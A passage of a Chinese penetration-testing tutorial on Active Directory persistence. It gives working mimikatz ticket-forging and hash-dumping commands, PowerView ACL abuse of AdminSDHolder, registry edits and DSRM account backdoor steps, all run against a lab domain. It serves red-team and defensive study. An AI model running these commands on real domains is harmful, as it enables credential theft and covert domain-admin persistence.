  * 可以伪造任意用户，即使其不存在。
  * krbtgt的NTLM hash不会轻易改变，即使修改域控管理员密码。  
# 白银票据  
Silver Tickets就是伪造的ST（Service
Ticket），因为在TGT已经在PAC里限定了给Client授权的服务（通过SID的值），所以白银票据只能访问指定服务。  
## 制作条件
> 1.域名称
>
> 2.域的SID值
>
> 3.域的服务账户的密码HASH（不是krbtgt，是域控）
>
> 4.伪造的用户名，可以是任意用户名，这里是testone
## 利用
首先我们需要知道服务账户的密码HASH，这里同样拿域控来举例，通过mimikatz查看当前域账号administrator的HASH值。注意，这里使用的不是Administrator账号的HASH，而是我们DC域控的HASH
    privilege::debug
    sekurlsa::logonpasswords
拿到了DC域控的hash：d0bcb64fc54fedf6adc2a53d78dcdec6
    /domain：当前域名称
    /sid：SID值，和金票一样取前面一部分
    /target：目标主机，这里是DC.redteam.local
    /service：服务名称，这里需要访问共享文件，所以是cifs
    /rc4：目标主机的HASH值
    /user：伪造的用户名
    /ptt：表示的是Pass TheTicket攻击，是把生成的票据导入内存，也可以使用/ticket导出之后再使用kerberos::ptt来导入
之后导入白银票据
    kerberos::golden /domain:redteam.local /sid:S-1-5-21-3458133008-801623762-2841880732 /target:DC.redteam.local /service:cifs /rc4:d0bcb64fc54fedf6adc2a53d78dcdec6 /user:testone /ptt
查看当前的票据并且访问域控成功  
## 黄金票据和白银票据的一些区别
##### 1.访问权限不同
  * Golden Ticket: 伪造TGT,可以获取任何Kerberos服务权限
  * Silver Ticket: 伪造TGS,只能访问指定的服务
##### 2.加密方式不同
  * Golden Ticket 由Kerberos的Hash—> krbtgt加密
  * Silver Ticket 由服务器端密码的Hash值—> master key 加密
##### 3.认证流程不同
  * Golden Ticket 的利用过程需要访问域控(KDC)
  * Silver Ticket 可以直接跳过 KDC 直接访问对应的服务器
# AdminSDHolder
AdminSDHolder是一个特殊的AD容器，具有一些默认安全权限，用作受保护AD账户和组的模板，当我们获取到域控权限，就可以通过授予该用户对容器进行滥用，使该用户成为域管。
默认情况下，该组的 ACL 被复制到所有“受保护组”中。这样做是为了避免有意或无意地更改这些关键组。但是，如果攻击者修改了AdminSDHolder组的
ACL，例如授予普通用户完全权限，则该用户将拥有受保护组内所有组的完全权限
## 利用
导入powerview脚本，将用户IT添加到对AdminSDHolder的具有完全访问权限
    Import-Module .\PowerView.ps1
    Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName IT -Verbose -Rights All
但是由于`SDPROP`的原因，默认等待60分钟之后生效  
所以我们可以修改生效的时间，1分钟后生效
    reg add hklm\SYSTEM\CurrentControlSet\Services\NTDS\Parameters /v AdminSDProtectFrequency /t REG_DWORD /d 60
之后导入  
查询新增的IT是否有权限
    Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'IT'}
查看域管  
重启IT机器，在IT机器上输入
    net group "domain admins" IT /add /domain
发现以IT的权限可以直接添加为域管  
并且在不是本地域管情况下，仍然可以和域控建立连接  
# SID History后门
## SID介绍
每个用户帐号都有一个对应的安全标识符（Security
Identifiers，SID），SID用于跟踪主体在访问资源时的权限。如果存在两个同样SID的用户，这两个帐户将被鉴别为同一个帐户，原理上如果帐户无限制增加的时候，会产生同样的SID，在通常的情况下SID是唯一的，他由计算机名、当前时间、当前用户态线程的CPU耗费时间的总和三个参数决定以保证它的唯一性。  
为了支持AD牵移，微软设计了SID History属性，SID History允许另一个帐户的访问被有效的克隆到另一个帐户。  
一个完整的SID包括：
  * 用户和组的安全描述
  * 48-bit的ID authority
  * 修订版本
  * 可变的验证值Variable sub-authority values
例：S-1-5-21-310440588-250036847-580389505-500  
第一项S表示该字符串是SID；第二项是SID的版本号，对于2000来说，这个就是1；然后是标志符的颁发机构（identifier
authority），对于2000内的帐户，颁发机构就是NT，值是5。然后表示一系列的子颁发机构，前面几项是标志域的，最后一个标志着域内的帐户和组。  
可以注意到最后一个标志位为500，这个500是相对标识符（Relative Identifer,
RID），账户的RID值是固定的。一般克隆用户原理就是篡改其他用户的RID值使系统认为对应用户是管理员。  
常见的RID：500-管理员 519-EA 501-Guest
## Sid history 利用
这里我使用winserver2019 17763 域控测试失败  
但是作者似乎没有修复这个问题：  
利用成功步骤可以参考[这里](https://www.c0bra.xyz/2021/02/17/%E5%9F%9F%E6%B8%97%E9%80%8F-SID-History%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%8F%8A%E5%9F%9F%E4%BF%A1%E4%BB%BB%E6%94%BB%E5%87%BB/)
# DSRM后门
DSRM ( Directory Services Restore
Mode,目录服务恢复模式)是Windows域环境中域控制器的安全模式启动选项。每个域控制器都有一个本地管理员账户
(也就是DSRM账户)。DSRM的用途是:允许管理员在域环境中出现故障或崩溃时还原、修复、重建活动目录数据库，使域环境的运行恢复正常。在域环境创建初期，DSRM的密码需要在安装DC时设置，且很少会被重置。修改DSRM密码最基本的方法是在DC上运行ntdsutil
命令行工具。
在渗透测试中，可以使用DSRM账号对域环境进行持久化操作。如果域控制器的系统版本为Windows Server
2008，需要安装KB961320才可以使用指定域账号的密码对DSRM的密码进行同步。在Windows Server
2008以后版木的系统中不需要安装此补丁。如果域控制器的系统版本为Windows Server 2003则不能使用该方法进行持久化操作。
## 利用
    ##打开ntdsutil。
    NTDSUTIL
    ##设置DSRM的密码。
    SET DSRM PASSWORD 
    ##使DSRM的密码和指定域用户的密码同步。
    SYNC FROM DOMAIN ACCOUNT domainusername
下面来对比一下
    privilege::debug
    lsadump::lsa /name:SIDTEST /inject
    privilege::debug
    token::elevate
    lsadump::sam
发现ntlm hash一致  
同时我们可以修改注册表
    New-ItemProperty "hklm:\system\currentcontrolset\control\lsa\" -name "dsrmadminlogonbehavior" -value 2 -propertyType DWORD
来使用DSRM账号通过网络登录域控
然后使用mimitatz pth即可
# 参考